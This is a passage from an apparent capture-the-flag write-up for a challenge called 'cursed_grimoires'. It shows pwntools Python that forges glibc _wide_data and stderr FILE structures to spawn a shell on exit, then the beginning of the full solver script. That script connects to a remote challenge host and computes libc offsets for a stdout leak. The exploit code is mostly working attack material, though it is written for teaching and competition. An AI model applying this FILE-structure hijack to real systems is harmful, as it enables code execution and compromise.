<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Setup fake _wide_data</span>
</span></span><span style="display:flex;"><span>fake_wide_data_addr                            <span style="color:#555">=</span> chunk_addr
</span></span><span style="display:flex;"><span>fake_wide_data_IO_write_base_offset_from_chunk <span style="color:#555">=</span> (fake_wide_data_addr <span style="color:#555">-</span> chunk_addr)<span style="color:#555">+</span><span style="color:#f60">0x20</span>
</span></span><span style="display:flex;"><span>fake_wide_data_IO_buf_base_offset_from_chunk   <span style="color:#555">=</span> (fake_wide_data_addr <span style="color:#555">-</span> chunk_addr)<span style="color:#555">+</span><span style="color:#f60">0x38</span>
</span></span><span style="display:flex;"><span>fake_wide_data_wide_vtable_offset_from_chunk   <span style="color:#555">=</span> (fake_wide_data_addr <span style="color:#555">-</span> chunk_addr)<span style="color:#555">+</span><span style="color:#f60">0xe0</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, num <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(p64(<span style="color:#f60">0</span>)): <span style="color:#09f;font-style:italic"># Set _wide_data-&gt;_IO_write_base_offset to 0</span>
</span></span><span style="display:flex;"><span>    edit(r, fake_wide_data_IO_write_base_offset_from_chunk<span style="color:#555">+</span>i, num)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, num <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(p64(<span style="color:#f60">0</span>)): <span style="color:#09f;font-style:italic"># Set _wide_data-&gt;_IO_buf_base_offset to 0</span>
</span></span><span style="display:flex;"><span>    edit(r, fake_wide_data_IO_buf_base_offset_from_chunk<span style="color:#555">+</span>i, num)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, num <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(p64(fake_wide_vtable_addr)): <span style="color:#09f;font-style:italic"># Set _wide_data-&gt;_wide_vtable to fake_wide_vtable_addr</span>
</span></span><span style="display:flex;"><span>    edit(r, fake_wide_data_wide_vtable_offset_from_chunk<span style="color:#555">+</span>i, num)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, forge the <code>stderr</code>.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Forge stderr</span>
</span></span><span style="display:flex;"><span>fake_stderr                <span style="color:#555">=</span> FileStructure(<span style="color:#f60">0</span>)
</span></span><span style="display:flex;"><span>fake_stderr<span style="color:#555">.</span>flags          <span style="color:#555">=</span> u64(<span style="color:#c30">b</span><span style="color:#c30">&#39;  sh</span><span style="color:#c30;font-weight:bold">\x00\x00\x00\x00</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>fake_stderr<span style="color:#555">.</span>_IO_write_base <span style="color:#555">=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>fake_stderr<span style="color:#555">.</span>_IO_write_ptr  <span style="color:#555">=</span> <span style="color:#f60">1</span> <span style="color:#09f;font-style:italic"># _IO_write_ptr &gt; _IO_write_base</span>
</span></span><span style="display:flex;"><span>fake_stderr<span style="color:#555">.</span>_wide_data     <span style="color:#555">=</span> fake_wide_data_addr
</span></span><span style="display:flex;"><span>fake_stderr<span style="color:#555">.</span>vtable         <span style="color:#555">=</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;_IO_wfile_jumps&#39;</span>]
</span></span><span style="display:flex;"><span>fake_stderr_bytes <span style="color:#555">=</span> <span style="color:#366">bytes</span>(fake_stderr)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, num <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(fake_stderr_bytes):
</span></span><span style="display:flex;"><span>    edit(r, stderr_offset_from_chunk<span style="color:#555">+</span>i, num)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Exit, and profit :D</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Exit and profit :D</span>
</span></span><span style="display:flex;"><span>exit_binary(r)
</span></span></code></pre></td></tr></table>
</div>
</div><p><p class="markdown-image">
  <img src="https://i.imgur.com/Jt3HyvS.png" alt=""  />
</p></p>
<p>Below is the full script for my solver:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;cursed_grimoires_patched&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>ld <span style="color:#555">=</span> ELF(<span style="color:#c30">&#34;./ld-linux-x86-64.so.2&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>binary <span style="color:#555">=</span> exe
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>remote_url <span style="color:#555">=</span> <span style="color:#c30">&#34;157.230.242.192&#34;</span>
</span></span><span style="display:flex;"><span>remote_port <span style="color:#555">=</span> <span style="color:#f60">30472</span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#555">=</span> <span style="color:#c30">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> process([exe<span style="color:#555">.</span>path], env<span style="color:#555">=</span>{})
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> args<span style="color:#555">.</span>PLT_DEBUG:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#555">.</span>attach(r, gdbscript<span style="color:#555">=</span>gdbscript)
</span></span><span style="display:flex;"><span>            pause()
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#555">=</span> remote(remote_url, remote_port)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">create</span>(r, size, content):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#366">str</span>(size)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, content)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">edit</span>(r, offset, val):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#366">str</span>(offset)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#366">bytes</span>([val]))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">exit_binary</span>(r):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;=&gt; &#39;</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Create a big chunk, so that our chunk is located on the newly page</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># created by mmap (To be precise, at libc_base-0xf7ff0)</span>
</span></span><span style="display:flex;"><span>chunk_size      <span style="color:#555">=</span> <span style="color:#f60">1000000</span>
</span></span><span style="display:flex;"><span>offset_to_libc  <span style="color:#555">=</span> <span style="color:#f60">0xf7ff0</span>
</span></span><span style="display:flex;"><span>create(r, chunk_size, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">8</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Leak libc base via stdout
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Prepare the correct offset for stdout and stderr</span>
</span></span><span style="display:flex;"><span>stdout_offset_from_chunk <span style="color:#555">=</span> offset_to_libc <span style="color:#555">+</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;_IO_2_1_stdout_&#39;</span>]
</span></span><span style="display:flex;"><span>stderr_offset_from_chunk <span style="color:#555">=</span> offset_to_libc <span style="color:#555">+</span> libc<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;_IO_2_1_stderr_&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Stdout offset: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(stdout_offset_from_chunk)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Stderr offset: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(stderr_offset_from_chunk)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
